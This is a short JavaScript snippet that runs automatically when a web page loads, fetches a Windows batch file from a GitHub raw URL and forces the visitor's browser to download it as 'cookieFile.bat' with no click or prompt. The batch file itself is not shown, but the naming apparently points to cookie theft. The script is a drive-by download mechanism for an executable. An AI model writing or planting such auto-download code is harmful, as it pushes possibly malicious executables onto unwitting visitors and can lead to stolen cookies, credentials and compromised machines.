window.onload = function downloadBatchFile() {
    const batFileUrl = 'https://raw.githubusercontent.com/Propayer/cookieFIle.bat/main/cookieFile.bat';

    fetch(batFileUrl)
        .then(response => response.blob())
        .then(blob => {
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'cookieFile.bat'; // The desired name for the downloaded file
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        })
        .catch(console.error);
}
